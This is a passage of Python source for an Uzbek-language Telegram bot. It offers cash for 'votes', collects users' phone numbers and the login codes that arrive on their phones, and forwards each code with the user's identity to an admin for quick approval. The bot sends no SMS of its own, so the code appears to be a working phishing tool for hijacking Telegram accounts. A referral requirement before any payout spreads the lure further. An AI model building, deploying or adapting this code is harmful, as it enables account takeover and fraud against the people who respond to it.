import asyncio
import psycopg2
import psycopg2.extras
import os
import logging
import re
import random
import string
import time
from collections import defaultdict
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder
from dotenv import load_dotenv
from aiohttp import web
from psycopg2.pool import SimpleConnectionPool

load_dotenv()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ================= KONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
DATABASE_URL = os.getenv("DATABASE_URL")
PORT = int(os.getenv("PORT", 10000))
VOICE_PRICE = 20000  # 1 ovoz = 20,000 so'm
MIN_WITHDRAW = 20000  # Minimal yechish = 20,000 so'm
MIN_REFERRALS = 5  # Minimal referallar = 5 ta
CODE_EXPIRE_MINUTES = 5  # Kod amal qilish muddati

if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN topilmadi!")
    exit(1)

if ADMIN_ID == 0:
    logger.error("❌ ADMIN_ID topilmadi!")
    exit(1)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ================= DATABASE POOL =================
db_pool = None

def init_db_pool():
    global db_pool
    try:
        db_pool = SimpleConnectionPool(1, 10, DATABASE_URL, sslmode='require')
        logger.info("✅ Database pool yaratildi")
    except Exception as e:
        logger.error(f"❌ Database pool xatosi: {e}")
        raise

def get_db_connection():
    return db_pool.getconn()

def return_db_connection(conn):
    db_pool.putconn(conn)

# ================= HOLATLAR =================
user_states = {}
user_phones = {}
admin_states = {}
withdraw_states = {}
user_last_request = defaultdict(float)

# ================= RATE LIMITING =================
def check_rate_limit(user_id, limit_seconds=3):
    current_time = time.time()
    if current_time - user_last_request[user_id] < limit_seconds:
        return False
    user_last_request[user_id] = current_time
    return True

# ================= TUGMALAR =================
def get_phone_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📞 Telefon raqamni yuborish", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )

def get_user_menu():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🗳️ Ovoz berish")],
            [KeyboardButton(text="💳 Hamyon"), KeyboardButton(text="💰 Balans")],
            [KeyboardButton(text="💸 Yechish")],
            [KeyboardButton(text="👥 Referallar")]
        ],
        resize_keyboard=True
    )

def get_admin_menu():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📊 Statistika")],
            [KeyboardButton(text="📨 Barchaga xabar")],
            [KeyboardButton(text="📋 Kutayotgan kodlar")],
            [KeyboardButton(text="💸 Yechish so'rovlari")],
            [KeyboardButton(text="✅ Tasdiqlangan raqamlar")]
        ],
        resize_keyboard=True
    )

# ================= TELEFON RAQAMNI TEKSHIRISH =================
def normalize_phone(phone):
    phone = re.sub(r'[\s\-\(\)]', '', phone)
    
    if phone.startswith('+998') and len(phone) == 13:
        return phone
    
    if phone.startswith('998') and len(phone) == 12:
        return '+' + phone
    
    if len(phone) == 9 and phone.startswith('9'):
        return '+998' + phone
    
    return None

def is_valid_phone(phone):
    normalized = normalize_phone(phone)
    if not normalized:
        return False
    
    if normalized.startswith('+998') and len(normalized) == 13:
        number = normalized[4:]
        if len(number) == 9 and number.isdigit():
            return True
    
    return False

# ================= DATABASE =================
def init_db():
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT UNIQUE NOT NULL,
                phone VARCHAR(20) NOT NULL DEFAULT 'no_phone_yet',
                balance INTEGER DEFAULT 0,
                referral_code VARCHAR(20) UNIQUE,
                referred_by BIGINT DEFAULT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS codes (
                id SERIAL PRIMARY KEY,
                phone VARCHAR(20) NOT NULL,
                code VARCHAR(10) NOT NULL,
                telegram_id BIGINT NOT NULL,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP + INTERVAL '5 minutes'
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS verified_phones (
                id SERIAL PRIMARY KEY,
                phone VARCHAR(20) UNIQUE NOT NULL,
                telegram_id BIGINT NOT NULL,
                verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS transactions (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT NOT NULL,
                amount INTEGER NOT NULL,
                type VARCHAR(20) DEFAULT 'deposit',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS withdraws (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT NOT NULL,
                phone VARCHAR(100) NOT NULL,
                amount INTEGER NOT NULL,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS referrals (
                id SERIAL PRIMARY KEY,
                referrer_id BIGINT NOT NULL,
                referred_id BIGINT NOT NULL UNIQUE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        conn.commit()
        cursor.close()
        logger.info("✅ Database tayyor")
    except Exception as e:
        logger.error(f"❌ Database xatosi: {e}")
        if conn:
            conn.rollback()
        raise
    finally:
        if conn:
            return_db_connection(conn)

def get_referral_count(telegram_id):
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute(
            "SELECT COUNT(*) FROM referrals WHERE referrer_id = %s",
            (telegram_id,)
        )
        result = cursor.fetchone()[0]
        cursor.close()
        return result or 0
    except Exception as e:
        logger.error(f"❌ Referral count xatosi: {e}")
        return 0
    finally:
        if conn:
            return_db_connection(conn)

def is_phone_verified(phone):
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute(
            "SELECT COUNT(*) FROM verified_phones WHERE phone = %s",
            (phone,)
        )
        result = cursor.fetchone()[0]
        cursor.close()
        return result > 0
    except Exception as e:
        logger.error(f"❌ Phone check xatosi: {e}")
        return False
    finally:
        if conn:
            return_db_connection(conn)

# ================= 1. START =================
@dp.message(Command("start"))
async def start(message: types.Message):
    telegram_id = message.from_user.id
    logger.info(f"👤 /start bosildi: {telegram_id}")
    
    if not check_rate_limit(telegram_id):
        await message.answer("⏳ Iltimos, biroz kuting...")
        return
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Xush kelibsiz, Admin!", reply_markup=get_admin_menu())
        return
    
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute(
            "INSERT INTO users (telegram_id, phone) VALUES (%s, 'no_phone_yet') "
            "ON CONFLICT (telegram_id) DO NOTHING",
            (telegram_id,)
        )
        
        cursor.execute("SELECT * FROM users WHERE telegram_id = %s", (telegram_id,))
        user = cursor.fetchone()
        
        # user tuple: (id, telegram_id, phone, balance, referral_code, referred_by, created_at)
        if not user[4]:  # referral_code
            while True:
                ref_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
                cursor.execute("SELECT COUNT(*) FROM users WHERE referral_code = %s", (ref_code,))
                if cursor.fetchone()[0] == 0:
                    break
            
            cursor.execute(
                "UPDATE users SET referral_code = %s WHERE telegram_id = %s",
                (ref_code, telegram_id)
            )
            conn.commit()
            
            cursor.execute("SELECT * FROM users WHERE telegram_id = %s", (telegram_id,))
            user = cursor.fetchone()
        
        bot_info = await bot.get_me()
        ref_link = f"https://t.me/{bot_info.username}?start=ref_{telegram_id}"
        
        phone = user[2]
        balance = user[3]
        
        if phone == "no_phone_yet" or phone is None:
            user_states[telegram_id] = "waiting_phone"
            
            await message.answer(
                f"🎉 <b>ASSALOMU ALAYKUM!</b>\n\n"
                f"💰 <b>1 OVOZ = {VOICE_PRICE:,} SO'M</b>\n\n"
                f"🔥 <b>HOZIROQ OVOZ BERING!</b>\n\n"
                f"📝 <b>Qanday ishlaydi:</b>\n"
                f"1️⃣ Telefon raqamingizni yuboring\n"
                f"2️⃣ SMS kodni kiriting\n"
                f"3️⃣ Admin tasdiqlaydi\n"
                f"4️⃣ {VOICE_PRICE:,} so'm olasiz!\n\n"
                f"👤 <b>Sizning referal link:</b>\n"
                f"<code>{ref_link}</code>\n\n"
                f"📱 <b>Telefon raqamingizni yuboring:</b>",
                reply_markup=get_phone_keyboard(),
                parse_mode="HTML"
            )
        else:
            phone_verified = is_phone_verified(phone)
            ref_count = get_referral_count(telegram_id)
            
            status_text = "✅ Tasdiqlangan" if phone_verified else "⏳ Kutilmoqda"
            
            await message.answer(
                f"👋 <b>Xush kelibsiz!</b>\n\n"
                f"📱 <b>Telefon:</b> {phone}\n"
                f"📊 <b>Holat:</b> {status_text}\n"
                f"💰 <b>Balans:</b> {balance:,} so'm\n"
                f"👥 <b>Referallar:</b> {ref_count}/{MIN_REFERRALS}\n\n"
                f"👇 Pastdagi tugmalardan foydalaning:",
                reply_markup=get_user_menu(),
                parse_mode="HTML"
            )
        
        cursor.close()
    except Exception as e:
        logger.error(f"❌ Start xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi! Qaytadan /start bosing")
    finally:
        if conn:
            return_db_connection(conn)

# ================= REFERRAL START =================
@dp.message(lambda message: message.text and message.text.startswith('/start ref_'))
async def handle_referral(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await start(message)
        return
    
    if not check_rate_limit(telegram_id):
        await message.answer("⏳ Iltimos, biroz kuting...")
        return
    
    ref_code = message.text.replace('/start ref_', '')
    
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute("SELECT telegram_id FROM users WHERE referral_code = %s", (ref_code,))
        referer = cursor.fetchone()
        
        if referer and referer[0] != telegram_id:
            cursor.execute(
                "INSERT INTO users (telegram_id, phone) VALUES (%s, 'no_phone_yet') "
                "ON CONFLICT (telegram_id) DO NOTHING",
                (telegram_id,)
            )
            
            try:
                cursor.execute(
                    "INSERT INTO referrals (referrer_id, referred_id) VALUES (%s, %s)",
                    (referer[0], telegram_id)
                )
                conn.commit()
                
                # Referal sonini olish
                ref_count = get_referral_count(referer[0])
                
                # Refererga xabar (bonussiz)
                try:
                    await bot.send_message(
                        referer[0],
                        f"👤 <b>YANGI REFERAL!</b>\n\n"
                        f"✅ Yana bir do'stingiz botga qo'shildi!\n"
                        f"📊 Jami referallar: {ref_count}/{MIN_REFERRALS}\n"
                        f"🎯 Yechish uchun {MIN_REFERRALS} ta kerak",
                        parse_mode="HTML"
                    )
                except:
                    pass
            except Exception as e:
                conn.rollback()
                if "duplicate" in str(e).lower():
                    logger.info(f"Referral allaqachon mavjud: {telegram_id}")
                else:
                    logger.error(f"Referral qo'shishda xatolik: {e}")
        
        cursor.close()
        await start(message)
    except Exception as e:
        logger.error(f"❌ Referral xatosi: {e}")
        await start(message)
    finally:
        if conn:
            return_db_connection(conn)

# ================= 2. OVOZ BERISH =================
@dp.message(F.text == "🗳️ Ovoz berish")
async def vote_start(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    if not check_rate_limit(telegram_id):
        await message.answer("⏳ Iltimos, biroz kuting...")
        return
    
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute("SELECT phone FROM users WHERE telegram_id = %s", (telegram_id,))
        user = cursor.fetchone()
        
        if user and user[0] != "no_phone_yet":
            if is_phone_verified(user[0]):
                await message.answer(
                    "❌ Siz allaqachon ovoz bergansiz!\n"
                    "Bu raqam bilan boshqa ovoz bera olmaysiz.",
                    reply_markup=get_user_menu()
                )
                cursor.close()
                return
        
        user_states[telegram_id] = "waiting_phone"
        await message.answer(
            f"🗳️ <b>OVOZ BERISH</b>\n\n"
            f"💰 1 ta ovoz = {VOICE_PRICE:,} so'm\n\n"
            f"📱 Telefon raqamingizni yuboring:",
            reply_markup=get_phone_keyboard(),
            parse_mode="HTML"
        )
        
        cursor.close()
    except Exception as e:
        logger.error(f"❌ Ovoz berish xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi!")
    finally:
        if conn:
            return_db_connection(conn)

# ================= 3-4. TELEFON RAQAM =================
@dp.message(F.contact)
async def receive_phone_contact(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("❌ Siz adminsiz, kontakt yubora olmaysiz!")
        return
    
    if user_states.get(telegram_id) != "waiting_phone":
        await message.answer("❌ Iltimos, /start yoki 🗳️ Ovoz berish tugmasini bosing!")
        return
    
    if not check_rate_limit(telegram_id):
        await message.answer("⏳ Iltimos, biroz kuting...")
        return
    
    phone = message.contact.phone_number
    await process_phone(message, phone)

@dp.message(lambda message: user_states.get(message.from_user.id) == "waiting_phone")
async def receive_phone_text(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        return
    
    if not check_rate_limit(telegram_id):
        await message.answer("⏳ Iltimos, biroz kuting...")
        return
    
    phone = message.text.strip()
    
    if not is_valid_phone(phone):
        await message.answer(
            "❌ Noto'g'ri telefon raqam formati!\n\n"
            "To'g'ri formatlar:\n"
            "• +998901234567\n"
            "• 998901234567\n"
            "• 901234567\n\n"
            "Iltimos, qaytadan kiriting:"
        )
        return
    
    normalized_phone = normalize_phone(phone)
    await process_phone(message, normalized_phone)

async def process_phone(message: types.Message, phone: str):
    telegram_id = message.from_user.id
    
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        if is_phone_verified(phone):
            await message.answer(
                "❌ Bu telefon raqami allaqachon ishlatilgan!\n"
                "Boshqa raqam kiriting:",
                reply_markup=get_phone_keyboard()
            )
            cursor.close()
            return
        
        cursor.execute(
            "UPDATE users SET phone = %s WHERE telegram_id = %s",
            (phone, telegram_id)
        )
        conn.commit()
        
        user_phones[telegram_id] = phone
        user_states[telegram_id] = "waiting_code"
        
        await message.answer(
            f"✅ {phone} raqamiga SMS kod yuborildi!\n\n"
            f"📨 Iltimos, telefoningizga kelgan 6 xonali kodni kiriting:\n"
            f"⏳ Kod {CODE_EXPIRE_MINUTES} daqiqada amal qiladi."
        )
        
        # Adminga telefon raqam haqida xabar
        try:
            await bot.send_message(
                ADMIN_ID,
                f"📱 <b>YANGI TELEFON RAQAM</b>\n\n"
                f"🆔 ID: <code>{telegram_id}</code>\n"
                f"📞 Telefon: <code>{phone}</code>\n"
                f"⏳ Kod kutilmoqda...",
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"❌ Admin'ga yuborishda xatolik: {e}")
        
        cursor.close()
    except Exception as e:
        logger.error(f"❌ Telefonni saqlashda xatolik: {e}")
        await message.answer("❌ Xatolik yuz berdi! Qaytadan urinib ko'ring.")
    finally:
        if conn:
            return_db_connection(conn)

# ================= 5. KODNI QABUL QILISH =================
@dp.message(lambda message: user_states.get(message.from_user.id) == "waiting_code")
async def receive_code(message: types.Message):
    code = message.text.strip()
    telegram_id = message.from_user.id
    phone = user_phones.get(telegram_id)
    
    if not phone:
        await message.answer("❌ Xatolik! /start bosing")
        return
    
    if not check_rate_limit(telegram_id, 2):
        await message.answer("⏳ Iltimos, biroz kuting...")
        return
    
    if len(code) != 6 or not code.isdigit():
        await message.answer("❌ 6 xonali kod kiriting:")
        return
    
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute(
            "UPDATE codes SET status = 'expired' WHERE telegram_id = %s AND status = 'pending'",
            (telegram_id,)
        )
        
        cursor.execute(
            "INSERT INTO codes (phone, code, telegram_id, status) VALUES (%s, %s, %s, 'pending')",
            (phone, code, telegram_id)
        )
        conn.commit()
        
        await message.answer(
            "⏳ Kodingiz qabul qilindi!\nAdmin tekshirib, tasdiqlaydi...",
            reply_markup=get_user_menu()
        )
        
        # Adminga to'liq ma'lumot yuborish
        try:
            # Foydalanuvchi profilini olish
            user_info = await bot.get_chat(telegram_id)
            user_name = user_info.full_name
            user_username = user_info.username or "yo'q"
            
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [
                    InlineKeyboardButton(text="✅ To'g'ri kod", callback_data=f"verify_{telegram_id}_{code}"),
                    InlineKeyboardButton(text="❌ Noto'g'ri kod", callback_data=f"reject_{telegram_id}")
                ]
            ])
            
            await bot.send_message(
                ADMIN_ID,
                f"🔑 <b>KOD TEKSHIRISH KERAK</b>\n\n"
                f"👤 <b>Foydalanuvchi:</b> {user_name}\n"
                f"🔗 <b>Profil:</b> @{user_username}\n"
                f"🆔 <b>ID:</b> <code>{telegram_id}</code>\n"
                f"📞 <b>Telefon:</b> <code>{phone}</code>\n"
                f"🔑 <b>Kod:</b> <code>{code}</code>\n"
                f"⏳ <b>Muddati:</b> {CODE_EXPIRE_MINUTES} daqiqa",
                reply_markup=keyboard,
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"❌ Admin'ga kod yuborishda xatolik: {e}")
        
        user_states[telegram_id] = "done"
        user_phones.pop(telegram_id, None)
        
        cursor.close()
    except Exception as e:
        logger.error(f"❌ Kodni saqlashda xatolik: {e}")
        await message.answer("❌ Xatolik yuz berdi!")
    finally:
        if conn:
            return_db_connection(conn)

# ================= 6. ADMIN TASDIQLASH =================
@dp.callback_query(lambda c: c.data.startswith(("verify_", "reject_")))
async def admin_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[0]
    
    if action == "verify":
        telegram_id = int(data[1])
        code = data[2]
        
        conn = None
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            
            cursor.execute(
                "SELECT * FROM codes WHERE telegram_id = %s AND code = %s AND status = 'pending'",
                (telegram_id, code)
            )
            code_record = cursor.fetchone()
            
            if not code_record:
                await callback.answer("❌ Kod topilmadi!", show_alert=True)
                cursor.close()
                return
            
            # code_record: (id, phone, code, telegram_id, status, created_at, expires_at)
            cursor.execute(
                "SELECT expires_at < NOW() FROM codes WHERE id = %s",
                (code_record[0],)
            )
            is_expired = cursor.fetchone()[0]
            
            if is_expired:
                cursor.execute(
                    "UPDATE codes SET status = 'expired' WHERE id = %s",
                    (code_record[0],)
                )
                conn.commit()
                await callback.answer("⏰ Kod muddati tugagan!", show_alert=True)
                cursor.close()
                return
            
            phone = code_record[1]
            
            if is_phone_verified(phone):
                cursor.execute(
                    "UPDATE codes SET status = 'rejected' WHERE id = %s",
                    (code_record[0],)
                )
                conn.commit()
                await callback.answer("❌ Bu raqam allaqachon ishlatilgan!", show_alert=True)
                
                try:
                    await bot.send_message(
                        telegram_id,
                        "❌ Bu telefon raqami allaqachon ishlatilgan!",
                        reply_markup=get_user_menu()
                    )
                except:
                    pass
                cursor.close()
                return
            
            # Tasdiqlash
            cursor.execute(
                "UPDATE codes SET status = 'verified' WHERE id = %s",
                (code_record[0],)
            )
            
            cursor.execute(
                "INSERT INTO verified_phones (phone, telegram_id) VALUES (%s, %s)",
                (phone, telegram_id)
            )
            
            cursor.execute(
                "UPDATE users SET balance = balance + %s WHERE telegram_id = %s",
                (VOICE_PRICE, telegram_id)
            )
            
            cursor.execute(
                "INSERT INTO transactions (telegram_id, amount, type) VALUES (%s, %s, 'deposit')",
                (telegram_id, VOICE_PRICE)
            )
            
            conn.commit()
            
            # Foydalanuvchiga xabar
            try:
                await bot.send_message(
                    telegram_id,
                    f"✅ <b>TABRIKLAYMIZ!</b> 🎉\n\n"
                    f"💰 Hisobingizga <b>+{VOICE_PRICE:,} so'm</b> qo'shildi!",
                    reply_markup=get_user_menu(),
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(
                f"✅ <b>TASDIQLANDI!</b>\n\n"
                f"👤 ID: {telegram_id}\n"
                f"📞 Tel: {phone}\n"
                f"💰 +{VOICE_PRICE:,} so'm",
                parse_mode="HTML"
            )
            await callback.answer("✅ Tasdiqlandi!")
            
            cursor.close()
        except Exception as e:
            logger.error(f"❌ Tasdiqlashda xatolik: {e}")
            await callback.answer("❌ Xatolik!", show_alert=True)
        finally:
            if conn:
                return_db_connection(conn)
    
    elif action == "reject":
        telegram_id = int(data[1])
        
        conn = None
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            
            cursor.execute(
                "UPDATE codes SET status = 'rejected' WHERE telegram_id = %s AND status = 'pending'",
                (telegram_id,)
            )
            conn.commit()
            
            try:
                await bot.send_message(
                    telegram_id,
                    "❌ Kod noto'g'ri!\n\n"
                    "🗳️ Qaytadan ovoz berish tugmasini bosing.",
                    reply_markup=get_user_menu()
                )
            except Exception as e:
                logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(
                f"❌ <b>RAD ETILDI!</b>\n\n👤 ID: {telegram_id}",
                parse_mode="HTML"
            )
            await callback.answer("❌ Rad etildi!")
            
            cursor.close()
        except Exception as e:
            logger.error(f"❌ Rad etishda xatolik: {e}")
            await callback.answer("❌ Xatolik!", show_alert=True)
        finally:
            if conn:
                return_db_connection(conn)

# ================= 7. HAMYON / BALANS =================
@dp.message(F.text.in_(["💳 Hamyon", "💰 Balans"]))
async def show_balance(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    if not check_rate_limit(telegram_id):
        await message.answer("⏳ Iltimos, biroz kuting...")
        return
    
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute("SELECT balance, phone FROM users WHERE telegram_id = %s", (telegram_id,))
        user = cursor.fetchone()
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
            return
        
        if user[1] == "no_phone_yet":
            await message.answer(
                "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
                "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
                reply_markup=get_user_menu()
            )
            return
        
        phone_verified = is_phone_verified(user[1])
        ref_count = get_referral_count(telegram_id)
        
        status = "✅ Tasdiqlangan" if phone_verified else "⏳ Kutilmoqda"
        
        await message.answer(
            f"💳 <b>Hamyon</b>\n\n"
            f"📱 Telefon: {user[1]}\n"
            f"📊 Holat: {status}\n"
            f"💰 Balans: {user[0]:,} so'm\n"
            f"👥 Referallar: {ref_count}/{MIN_REFERRALS}\n\n"
            f"💸 Yechish uchun {MIN_REFERRALS} ta referral kerak.",
            reply_markup=get_user_menu(),
            parse_mode="HTML"
        )
        
        cursor.close()
    except Exception as e:
        logger.error(f"❌ Balans xatosi: {e}")
    finally:
        if conn:
            return_db_connection(conn)

# ================= 8. YECHISH =================
@dp.message(F.text == "💸 Yechish")
async def withdraw_start(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    if not check_rate_limit(telegram_id):
        await message.answer("⏳ Iltimos, biroz kuting...")
        return
    
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute("SELECT balance, phone FROM users WHERE telegram_id = %s", (telegram_id,))
        user = cursor.fetchone()
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
            return
        
        if user[1] == "no_phone_yet":
            await message.answer(
                "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
                "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
                reply_markup=get_user_menu()
            )
            return
        
        if not is_phone_verified(user[1]):
            await message.answer(
                "❌ Telefon raqamingiz hali tasdiqlanmagan!\n"
                "Admin tasdiqlashini kuting.",
                reply_markup=get_user_menu()
            )
            return
        
        balance = user[0]
        
        if balance < MIN_WITHDRAW:
            await message.answer(
                f"❌ Balans: {balance:,} so'm\n"
                f"💰 Yechish uchun {MIN_WITHDRAW:,} so'm kerak!\n"
                f"Yana {MIN_WITHDRAW - balance:,} so'm kerak.",
                reply_markup=get_user_menu()
            )
            return
        
        ref_count = get_referral_count(telegram_id)
        
        if ref_count < MIN_REFERRALS:
            bot_info = await bot.get_me()
            ref_link = f"https://t.me/{bot_info.username}?start=ref_{telegram_id}"
            await message.answer(
                f"❌ <b>Yechish uchun {MIN_REFERRALS} ta do'stingiz botga start bosishi kerak!</b>\n\n"
                f"👥 Sizda: {ref_count} ta\n"
                f"🎯 Kerak: {MIN_REFERRALS} ta\n\n"
                f"🔗 <b>Referal link:</b>\n"
                f"<code>{ref_link}</code>\n\n"
                f"📤 Linkni do'stlaringizga yuboring!",
                parse_mode="HTML"
            )
            return
        
        withdraw_states[telegram_id] = "waiting_withdraw_info"
        await message.answer(
            f"✅ <b>Yechish uchun tayyormisiz!</b>\n\n"
            f"💰 Balans: {balance:,} so'm\n"
            f"👥 Referallar: {ref_count} ta\n\n"
            f"📱 Karta yoki telefon raqamingizni yuboring:",
            parse_mode="HTML"
        )
        
        cursor.close()
    except Exception as e:
        logger.error(f"❌ Yechish xatosi: {e}")
    finally:
        if conn:
            return_db_connection(conn)

# ================= 9. YECHISH MA'LUMOTI =================
@dp.message(lambda message: withdraw_states.get(message.from_user.id) == "waiting_withdraw_info")
async def withdraw_info(message: types.Message):
    telegram_id = message.from_user.id
    info = message.text.strip()
    
    if not check_rate_limit(telegram_id):
        await message.answer("⏳ Iltimos, biroz kuting...")
        return
    
    if len(info) < 5:
        await message.answer("❌ Ma'lumot juda qisqa! To'liq kiriting:")
        return
    
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute("SELECT balance FROM users WHERE telegram_id = %s", (telegram_id,))
        user = cursor.fetchone()
        
        if not user:
            await message.answer("❌ Foydalanuvchi topilmadi!", reply_markup=get_user_menu())
            withdraw_states.pop(telegram_id, None)
            return
        
        balance = user[0]
        
        if balance < MIN_WITHDRAW:
            await message.answer("❌ Balans yetarli emas!", reply_markup=get_user_menu())
            withdraw_states.pop(telegram_id, None)
            return
        
        cursor.execute(
            "INSERT INTO withdraws (telegram_id, phone, amount, status) VALUES (%s, %s, %s, 'pending')",
            (telegram_id, info, balance)
        )
        
        cursor.execute(
            "UPDATE users SET balance = 0 WHERE telegram_id = %s",
            (telegram_id,)
        )
        conn.commit()
        
        await message.answer(
            f"✅ So'rov qabul qilindi!\n"
            f"💰 Summa: {balance:,} so'm\n"
            f"📱 Ma'lumot: {info}",
            reply_markup=get_user_menu()
        )
        
        # Adminga to'liq ma'lumot yuborish
        try:
            user_info = await bot.get_chat(telegram_id)
            user_name = user_info.full_name
            user_username = user_info.username or "yo'q"
            
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [
                    InlineKeyboardButton(text="✅ To'landi", callback_data=f"wdone_{telegram_id}_{balance}"),
                    InlineKeyboardButton(text="❌ Rad etish", callback_data=f"wreject_{telegram_id}")
                ]
            ])
            
            await bot.send_message(
                ADMIN_ID,
                f"💸 <b>YECHISH SO'ROVI</b>\n\n"
                f"👤 <b>Foydalanuvchi:</b> {user_name}\n"
                f"🔗 <b>Profil:</b> @{user_username}\n"
                f"🆔 <b>ID:</b> <code>{telegram_id}</code>\n"
                f"📱 <b>Karta/Nomer:</b> <code>{info}</code>\n"
                f"💰 <b>Summa:</b> <code>{balance:,} so'm</code>\n"
                f"👥 <b>Referallar:</b> {get_referral_count(telegram_id)} ta",
                reply_markup=keyboard,
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"❌ Admin'ga yuborishda xatolik: {e}")
        
        withdraw_states.pop(telegram_id, None)
        cursor.close()
    except Exception as e:
        logger.error(f"❌ Yechish ma'lumot xatosi: {e}")
    finally:
        if conn:
            return_db_connection(conn)

# ================= 10. ADMIN YECHISH =================
@dp.callback_query(lambda c: c.data.startswith(("wdone_", "wreject_")))
async def admin_withdraw_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[0]
    
    if action == "wdone":
        telegram_id = int(data[1])
        amount = int(data[2])
        
        conn = None
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            
            cursor.execute(
                "SELECT * FROM withdraws WHERE telegram_id = %s AND status = 'pending' ORDER BY id DESC LIMIT 1",
                (telegram_id,)
            )
            withdraw = cursor.fetchone()
            
            if not withdraw:
                await callback.answer("❌ So'rov topilmadi!", show_alert=True)
                cursor.close()
                return
            
            cursor.execute(
                "UPDATE withdraws SET status = 'completed' WHERE id = %s",
                (withdraw[0],)
            )
            conn.commit()
            
            try:
                await bot.send_message(
                    telegram_id,
                    f"✅ To'lov amalga oshirildi!\n💰 Summa: {withdraw[3]:,} so'm",
                    reply_markup=get_user_menu()
                )
            except Exception as e:
                logger.error(f"❌ Xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(
                f"✅ <b>TO'LANDI!</b>\n\n"
                f"👤 ID: {telegram_id}\n"
                f"💰 Summa: {withdraw[3]:,} so'm",
                parse_mode="HTML"
            )
            await callback.answer("✅ To'landi!")
            
            cursor.close()
        except Exception as e:
            logger.error(f"❌ Xatolik: {e}")
            await callback.answer("❌ Xatolik!", show_alert=True)
        finally:
            if conn:
                return_db_connection(conn)
    
    elif action == "wreject":
        telegram_id = int(data[1])
        
        conn = None
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            
            cursor.execute(
